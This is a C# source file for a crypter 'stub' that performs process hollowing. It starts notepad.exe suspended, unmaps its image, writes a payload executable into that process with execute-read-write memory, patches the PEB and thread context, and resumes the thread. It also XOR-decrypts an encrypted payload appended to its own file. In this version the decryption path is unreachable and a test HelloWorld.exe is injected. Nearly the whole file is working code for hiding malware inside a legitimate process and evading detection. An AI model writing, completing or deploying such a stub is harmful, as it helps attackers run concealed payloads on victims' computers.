using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace SomeAwesomeStub
{
    public partial class StubTest : Form
    {
        // ==================================================
        // Some Win32 functions need to be loaded and managed
        // ==================================================
        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        private static extern bool CreateProcess(
            string lpApplicationName,
            string lpCommandLine,
            IntPtr lpProcessAttributes,
            IntPtr lpThreadAttributes,
            bool bInheritHandles,
            uint dwCreationFlags,
            IntPtr lpEnvironment,
            string lpCurrentDirectory,
            byte[] lpStartupInfo,
            byte[] lpProcessInformation);

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtQueryInformationProcess(IntPtr processHandle,
            int processInformationClass, byte[] processInformation, uint processInformationLength,
            IntPtr returnLength);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool ReadProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            [Out] byte[] lpBuffer,
            int dwSize,
            out IntPtr lpNumberOfBytesRead);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        private static extern IntPtr VirtualAlloc(UIntPtr lpAddress, UIntPtr dwSize,
            int flAllocationType, int flProtect);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        private static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress,
            uint dwSize, int flAllocationType, int flProtect);

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern uint NtUnmapViewOfSection(IntPtr hProc, IntPtr baseAddr);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool WriteProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            byte[] lpBuffer,
            Int32 nSize,
            out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool GetThreadContext(IntPtr hThread, byte[] lpContext);

        [DllImport("kernel32.dll")]
        private static extern bool SetThreadContext(IntPtr hThread, byte[] lpContext);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern uint ResumeThread(IntPtr hThread);


        // ==================================================
        // Some Win32 constants
        // ==================================================
        private const int       CREATE_SUSPENDED = 0x4;
        private const ushort IMAGE_DOS_SIGNATURE = 0x5A4D;
        private const int    IMAGE_NT_SIGNATURE = 0x00004550; // PE00
        private const int PAGE_EXECUTE_READWRITE = 0x40;
        private const int             MEM_COMMIT = 0x00001000;
        private const int            MEM_RESERVE = 0x00002000;
        // ==================================================

        private int byteOffset = 15000;
        // The secret key used to encrypt / decrypt the executive code. The stub and crypter key
        // both must have the same key for this to work.
        private byte[] secretKey = new byte[] { 0x10, 0x20, 0x92, 0x12, 0x29 };

        public StubTest()
        {
            InitializeComponent();
        }

        private IntPtr GetProcessEnvBlockAddress(long hProcess)
        {
            /*
             * This whole function gets the process environmental block from memory and returns it
             * in a byte array.
             * 
             * How we managed to get the size of the block and the size of the basic information
             * is from the documentation. The size of the basic information block can be retrieved
             * from this link:
             * https://msdn.microsoft.com/en-us/library/windows/desktop/ms684280(v=vs.85).aspx
             * 
             * The processEnvBlock is retrieved from the same page. We use arthimetric to calculate
             * the size of the PEB block.
             */
            IntPtr returnLength = new IntPtr(0);
            IntPtr ptrPEB = new IntPtr();
            byte[] basicInformation = new byte[48];

            Console.WriteLine(hProcess);

            NtQueryInformationProcess((IntPtr)hProcess, 0, basicInformation, 48, returnLength);
            ptrPEB = (IntPtr)BitConverter.ToInt64(basicInformation, 8);
            eventLog.AppendText("What do we get as a return length: " + returnLength + Environment.NewLine);
            return ptrPEB;
        }

        private NativePEBlock GetImageBaseAddress(long hProcess)
        {
            IntPtr sink = new IntPtr(); // This is just to dump the output data we do not need
            IntPtr ptrPEB = GetProcessEnvBlockAddress(hProcess);
            byte[] PEBBlock = new byte[Marshal.SizeOf(typeof(NativePEBlock))];

            eventLog.AppendText("Pointer to PEB: " + ptrPEB + Environment.NewLine);

            bool result = ReadProcessMemory(
                    (IntPtr)hProcess,
                    ptrPEB, PEBBlock,
                    Marshal.SizeOf(typeof(NativePEBlock)),
                    out sink
                );

            // If it was a success reading the process memory, we are going to push the data into the
            // struct we have
            if (result)
            {
                // This is just to clean up the code so everything is readable. It can be done easily
                // With BitConverter but the code gets extremely atrocious eventually.
                GCHandle handle = GCHandle.Alloc(PEBBlock, GCHandleType.Pinned);
                NativePEBlock pEBlock = (NativePEBlock)Marshal.PtrToStructure(
                                                        handle.AddrOfPinnedObject(),
                                                        typeof(NativePEBlock)
                                                    );
                handle.Free();
                return pEBlock;
            }

            return new NativePEBlock();
        }

        private void RunPayLoad(byte[] byteData)
        {
            // Use this pointer to get the return information that we do not need.
            IntPtr bytesWritten = new IntPtr();

            // When you initialise a byte array, it is already 0
            byte[] PROCESS_INFORMATION = new byte[24];
            byte[] STARTUP_INFO = new byte[104];

            // Refer to this website for a guide as we explore the program
            // https://resources.infosecinstitute.com/2-malware-researchers-handbook-demystifying-pe-file/
            // First, we want to get the DOS header from the executable

            byte[] IMAGE_DOS_HEADER = new byte[Marshal.SizeOf(typeof(DOSHeader))];
            Buffer.BlockCopy(byteData, 0, IMAGE_DOS_HEADER, 0, IMAGE_DOS_HEADER.Length);

            GCHandle handle = GCHandle.Alloc(byteData, GCHandleType.Pinned);
            DOSHeader DOSPayLoadHeaderBlock = (DOSHeader)Marshal.PtrToStructure(
                                                    handle.AddrOfPinnedObject(),
                                                    typeof(DOSHeader)
                                                );
            handle.Free();

            // Let us check to see if we have the MZ magic number
            // Perform a sanity check
            if (DOSPayLoadHeaderBlock.Signature != IMAGE_DOS_SIGNATURE)
            {
                InfoMsg.Text = "Payload is not a valid executable. Dos signature is not valid.";
                return;
            }

            // Then get the PE NT File Headers
            byte[] IMAGE_NT_HEADERS = new byte[Marshal.SizeOf(typeof(ImageNTHeader))];
            Buffer.BlockCopy(byteData, DOSPayLoadHeaderBlock.e_lfanew, IMAGE_NT_HEADERS, 0, IMAGE_NT_HEADERS.Length);

            handle = GCHandle.Alloc(IMAGE_NT_HEADERS, GCHandleType.Pinned);
            ImageNTHeader NTPayLoadHeaderBlock = (ImageNTHeader)Marshal.PtrToStructure(
                                                    handle.AddrOfPinnedObject(),
                                                    typeof(ImageNTHeader)
                                                );
            handle.Free();

            // Check the PE Header is valid
            if (NTPayLoadHeaderBlock.Signature != IMAGE_NT_SIGNATURE)
            {
                InfoMsg.Text = "Payload is not a valid executable. NTHeader is not valid.";
                return;
            }

            // Now, time to run a process
            string hostProcess = System.Reflection.Assembly.GetEntryAssembly().Location;
            hostProcess = "C:/Windows/notepad.exe";
            if (!CreateProcess(hostProcess, null, IntPtr.Zero, IntPtr.Zero, false, CREATE_SUSPENDED,
                IntPtr.Zero, null, STARTUP_INFO, PROCESS_INFORMATION))
            {
                InfoMsg.Text = "Can not start host process. Terminating.";
                return;
            }
            
            // Note, the Handle variable is 8 bytes big due to the 64 bit system
            long processID = BitConverter.ToInt64(PROCESS_INFORMATION, 0);
            NativePEBlock pEBBlock = GetImageBaseAddress(processID);
            IntPtr pHostImageBase = pEBBlock.ImageBaseAddress;

            // According to documentation, the result code from this function is a success if equal
            // to 0. There are more codes which you can check.
            uint result = NtUnmapViewOfSection((IntPtr)processID, pHostImageBase);
            if (result != 0)
            {
                eventLog.AppendText("Error: Unable to unmap host process image.");
                return;
            }

            IntPtr remoteImage = VirtualAllocEx(
                (IntPtr)processID,
                pHostImageBase,
                (uint)NTPayLoadHeaderBlock.OptionalHeader.SizeOfImage,
                (MEM_COMMIT | MEM_RESERVE),
                PAGE_EXECUTE_READWRITE
            );

            if (remoteImage.Equals(IntPtr.Zero))
            {
                eventLog.AppendText("Unable to allocate memory" + Environment.NewLine);
                return;
            }

            // Now we need to check if we need to do a rebase of the image
            eventLog.AppendText("Host Image Base: " + pHostImageBase.ToString("X") + Environment.NewLine);
            eventLog.AppendText("Payload Image Base: " +
                    NTPayLoadHeaderBlock.OptionalHeader.ImageBase.ToString("X") +
                    Environment.NewLine
                );
            long relocDelta = pHostImageBase.ToInt64() - NTPayLoadHeaderBlock.OptionalHeader.ImageBase;

            // ====================================================================================
            // Now that everything is prepared, we are going to start reallocation memory starting
            // from here.
            // ====================================================================================
            NTPayLoadHeaderBlock.OptionalHeader.ImageBase = pHostImageBase.ToInt64();

            // Now, we need to write to process memory the headers
            if (!WriteProcessMemory(
                    (IntPtr)processID,
                    pHostImageBase,
                    byteData,
                    NTPayLoadHeaderBlock.OptionalHeader.SizeOfHeaders,
                    out bytesWritten
                ))
            {
                eventLog.AppendText("Can not write to process memory!" + Environment.NewLine);
                return;
            }

            // This is where we need to write the section data
            for (int i = 0; i < NTPayLoadHeaderBlock.FileHeader.NumberOfSections; i++)
            {
                byte[] IMAGE_SECTION_HEADER = new byte[40];
                int sectionOffset = DOSPayLoadHeaderBlock.e_lfanew + IMAGE_NT_HEADERS.Length + 8 + IMAGE_SECTION_HEADER.Length * i;
                Buffer.BlockCopy(byteData, sectionOffset, IMAGE_SECTION_HEADER, 0, 40);

                int rawDataSize = BitConverter.ToInt32(IMAGE_SECTION_HEADER, 16);
                int rawDataAddOffset = BitConverter.ToInt32(IMAGE_SECTION_HEADER, 20);
                int virtualAddressOffset = BitConverter.ToInt32(IMAGE_SECTION_HEADER, 12);
                byte[] sectionData = new byte[rawDataSize];

                Buffer.BlockCopy(byteData, rawDataAddOffset, sectionData, 0, rawDataSize);

                // Now we are going to write the raw section data to the virtual memory area we created
                if (rawDataSize == 0) continue;
                if (!WriteProcessMemory(
                        (IntPtr)processID,
                        (pHostImageBase + virtualAddressOffset),
                        sectionData,
                        rawDataSize,
                        out bytesWritten
                ))
                {
                    eventLog.AppendText("Can not write to process memory!" + Environment.NewLine);
                    return;
                }
            }

            long entryPoint = pHostImageBase.ToInt64() + NTPayLoadHeaderBlock.OptionalHeader.AddressOfEntryPoint;

            byte[] test = new byte[200];
            bool test2 = ReadProcessMemory(
                    (IntPtr)processID,
                    (IntPtr)entryPoint,
                    test,
                    200,
                    out bytesWritten
                );

            IntPtr ptrHandleThread = (IntPtr)BitConverter.ToInt64(PROCESS_INFORMATION, 8);
            byte[] CONTEXT = new byte[1232];
            // This is the CONTEXT_INTEGER flag that I hard coded in
            BitConverter.GetBytes(1048587).CopyTo(CONTEXT, 48);

            if (!GetThreadContext(ptrHandleThread, CONTEXT))
            {
                ResumeThread(ptrHandleThread);
                eventLog.AppendText("Can not retrieve CONTEXT!" + Environment.NewLine);
                return;
            }


            // Yes this gets the PEB ptr address. I do not know how.
            IntPtr ptrToPEB = (IntPtr)BitConverter.ToInt64(CONTEXT, 136);
            pEBBlock.ImageBaseAddress = (IntPtr)entryPoint;

            byte[] pEBBlockRaw = new byte[Marshal.SizeOf(typeof(NativePEBlock))];

            IntPtr ptr = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(NativePEBlock)));
            Marshal.StructureToPtr(pEBBlock, ptr, true);
            Marshal.Copy(ptr, pEBBlockRaw, 0, Marshal.SizeOf(typeof(NativePEBlock)));
            Marshal.FreeHGlobal(ptr);

            if (!WriteProcessMemory(
                        (IntPtr)processID,
                        ptrToPEB,
                        pEBBlockRaw,
                        Marshal.SizeOf(typeof(NativePEBlock)),
                        out bytesWritten
                ))
            {
                eventLog.AppendText("Can not write to PEB Block!" + Environment.NewLine);
                return;
            }

            BitConverter.GetBytes(entryPoint).CopyTo(CONTEXT, 128); //Write to the RCX

            if (!SetThreadContext(ptrHandleThread, CONTEXT))
            {
                ResumeThread(ptrHandleThread);
                eventLog.AppendText("Can not set CONTEXT!" + Environment.NewLine);
                return;
            }
            
            if (ResumeThread(ptrHandleThread) == 0)
            {
                eventLog.AppendText("Failed to resume Thread" + Environment.NewLine);
                return;
            }

            int error = Marshal.GetLastWin32Error();
            Console.WriteLine("The last Win32 Error was: " + error);
            eventLog.AppendText("We should be finished with injection." + Environment.NewLine);
        }

        private void BtnStubRun_Click(object sender, EventArgs e)
        {
            // Get the exe file path.
            string thisFilePath = System.Reflection.Assembly.GetEntryAssembly().Location;
            // Load all of the bytes of the file into an byte array.
            byte[] thisFileBytes = System.IO.File.ReadAllBytes("HelloWorld.exe");

            RunPayLoad(thisFileBytes);

            return;
            // How much bytes is in this exe
#pragma warning disable CS0162 // Unreachable code detected
            InfoNumBytes.Text = "Number of bytes in this exe: " + thisFileBytes.Length.ToString();
#pragma warning restore CS0162 // Unreachable code detected

            // We are going to make a rule that if the byteOffset is not bigger than 0, we will
            // not run the program. This is because 0 byteOFfset means the necessary changes to
            // make this work has not be implemented.
            if (byteOffset > 0)
            {
                // We will add 1 last check to ensure the stub has being embedded.
                if (byteOffset > thisFileBytes.Length)
                {
                    InfoMsg.Text = "The stub has not yet being embedded with an encrypted" +
                        " payload";
                    return;
                }
                // We get the size of the encrypted executable, use it to create an byte array that
                // hold the decrypted bytes.
                int sizeOfEncryptedExe = thisFileBytes.Length - byteOffset;
                byte[] decryptedExecutable = new byte[sizeOfEncryptedExe];

                for (int i = 0; i < sizeOfEncryptedExe; i++)
                {
                    decryptedExecutable[i] =
                        (byte)(thisFileBytes[byteOffset + i] ^ secretKey[i % secretKey.Length]);
                }

                RunPayLoad(decryptedExecutable);
            }
            else
            {
                InfoMsg.Text = "Program will not run as byteOffset is still set to 0";
            }
        }
    }
}
